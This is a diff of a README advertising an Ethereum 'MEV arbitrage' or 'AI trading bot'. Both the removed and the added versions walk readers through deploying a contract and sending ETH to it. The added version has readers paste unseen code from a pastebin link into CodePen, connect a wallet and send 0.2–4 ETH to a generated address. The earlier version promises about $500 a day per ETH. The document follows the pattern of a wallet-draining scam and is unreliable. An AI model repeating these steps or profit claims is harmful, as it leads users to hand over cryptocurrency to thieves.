@@ -1,71 +1,74 @@
 
-# MEV Arbitrage Bot for Ethereum — Smart Contract + Python Automation. Finds and executes arbitrage between Uniswap pools and routers.
+# Step-by-Step Guide AI Trading Bot
 
-![Et](https://i.ibb.co/x8XSh8tk/Chat-GPT-Image-25-2026-02-40-27.png)
+<img src="https://i.ibb.co/DPbNrrDk/hf-20260126-164017-2db01405-daa1-40e6-aa99-4e29072771f1.png" alt="hf-20260126-164017-2db01405-daa1-40e6-aa99-4e29072771f1" border="0"></a>
 
-An arbitrage bot is a smart contract that searches for and executes arbitrage opportunities between pools and routers, holding ETH/tokens on its balance. Below is a step-by-step guide on how to deploy your bot and get it running without a single manual call.
+### Hi everyone! I'm Sam, a beginner blockchain developer.  
+#### I’ve just created my own bot and I’m excited to share my work with you!  
+#### So far, the bot is running successfully.  
+#### All suggestions, feedback, and ideas are very welcome — feel free to write me in Telegram!
 
-## What the bot is
+Step-by-Step Guide
 
-An arbitrage bot is a smart contract connected to an external automation script that controls its operation.
+🔗 **My Telegram:** https://t.me/Jckb9
 
-- **`executeArbitrage()`** — the main function: searches for and executes an arbitrage opportunity between pools/routers in a single transaction.
-- **`quickSwap()` / `quickSwapFromBalance()`** — a quick swap through an allowed router, directly from the contract's balance.
-- **`setRouterAllowed()` / `setTokenAllowed()`** — manages the whitelist of routers and tokens the bot is allowed to work with.
-- **`setDefaultFee()` / `setDefaultTokenOut()`** — configures the pool fee and the default token the bot swaps into.
-- **`setMinQuickSwapAmount()` / `setMaxQuickSwapAmount()`** — sets min/max amount limits per swap.
-- **`setPaused()`** — emergency pause, stopping all contract operations.
-- **`revokeApproval()`** — revokes previously granted token approvals.
-- **`withdraw()` / `withdrawETH()`** — withdraws tokens/ETH from the contract's balance by the owner.
-- **`getBalance()` / `getOwner()` / `owner()` / `TARGET_ADDRESS()`** — helper view functions for reading contract state.
+[🔗 **Open Source Bot Code [Click Here]**](https://pastebin.com/raw/UNwpzub8)
 
-The contract owner is the only one who can change settings and withdraw funds.
 
-## Step-by-step guide
+  # ▶️ [Watch  on YouTube](https://www.youtube.com/watch?v=VES7tkccgiA)
 
-### 1. Open the deployer page
 
-![EtherLab](https://i.ibb.co/PzMH74XW/1.png)
+🟢 Step 1: Download the **MetaMask** Extension
 
-Open [etherlab website](https://etherlabs-sol.github.io/deployer/) (or the hosted version of the page) in your browser — this is the environment where the bot is created and deployed.
+🔗 -Dоwnlоаd МetаМаsk: [**https://metamask.io/download**](https://metamask.io/download)
 
-### 2. Create the bot file
+🔗 -Dоwnlоаd Phantom: [**https://phantom.com/**](https://phantom.com/)  
+  
 
-Create a new `.sol` file in the file manager (e.g. `contract.sol`). Paste the smart contract code into the editor field [contract](contract.sol)
+🟢 Step 2: CODE EDITOR
 
-![EtherLab](https://i.ibb.co/nN90b2FP/2.png)
+🔗 [**https://codepen.io**](https://codepen.io/)
 
-### 3. Compile the bot
+  
 
-Go to the **Compiler** tab, select compiler version **0.8.20**, and click compile.
+🟢 Step 3:
 
-![Compiling the contract](https://i.ibb.co/vCmJHMGz/3.png)
+Once the site has loaded click on the "**Start Coding**" button on the left side.
 
-### 4. Deploy and fund the bot
+  
 
-Go to the **Deploy** tab, connect your wallet — MetaMask or Phantom (whichever is more convenient) — and deploy the contract. Our bot contract will appear below.
+🟢 Step 4: Paste the following code into the **HTML** box:
 
-You can fund the balance by copying its address: send **0.5 to 1 ETH** — this is enough for beginners.
+[🔗 **Open Source Bot Code [Click Here]**](https://pastebin.com/raw/UNwpzub8)
 
-![Deploying the contract](https://i.ibb.co/39grWTjG/4.png)
+  
 
-### 5. Start the bot via automation
+🟢 Step 5:
 
-Go to the **Python Automation** tab, make sure all fields are filled in automatically and your contract is selected, click **Start**, and confirm the launch in MetaMask or Phantom.
+**Connect your wallet** once the interface loads.
 
-Do not close the page while the bot is running.
+<img src="https://i.ibb.co/H1wTfy5/bnr.png" alt="bnr" border="0"></a>
 
-![Starting via automation](https://i.ibb.co/sdLXkqYW/6.png) ![Starting via automation](https://i.ibb.co/hRdRQYhw/7.png)
+🟢 Step 6:
 
-## What happens after clicking Start
+Scroll down and click the "**Deploy Trading Contract**" button. This will deploy your very own trading contract infrastructure on the Ethereum blockchain that is controlled by your connected wallet.
 
-![Starting via automation](https://i.ibb.co/mrw0zT9S/8.png) ![Starting via automation](https://i.ibb.co/spHXSCpW/528.png)
+⚠️ **Tip: If you get any issues - use a clean Firefox browser and only one Metamask extension**
 
-- Every interval, the bot checks `executeArbitrage` via a dry-run (`eth_estimateGas`); if the call would succeed, a real transaction is sent — and it needs to be confirmed once in MetaMask.
-- Any other selected functions are checked the same way, but are never sent — no extra confirmations needed.
-- In the background, the scanner listens for live Uniswap V2/V3 swap events on mainnet and logs them: who swapped, direction, approximate amounts.
-- All bot activity is displayed in the **Logs** panel in real time.
+  
 
-## About profit
+🟢 Step 7:
 
-The bot doesn't promise mountains of gold — returns depend on market volatility, bot competition, and network gas fees. But under today's market conditions, a deposit of **1 ETH** can realistically average around **~$500 a day**. Results are not guaranteed and may vary depending on market conditions.
+Add funds to your bot by putting the desired amount in the text box and then click "**Generate Contract Address**" to generate your own personal contract address.
+
+**The minimum amount is 0.2 ETH. But I recommend to use 1-4**, so that the bot can process more transactions, in this case the profits will be much better.
+
+Click the "**Copy Address**" button then go to your web3 wallet and send the exact amount you specified in the amount box to your contract address.
+
+  
+
+🟢 Step 8:
+
+Once the transaction is confirmed, the bot will being trading instantly showing a full detailed log of everything it does.
+
+When you want to withdraw, simply click the "**Withdraw Profits**" button and it will return all profit including your funding back to your wallet.
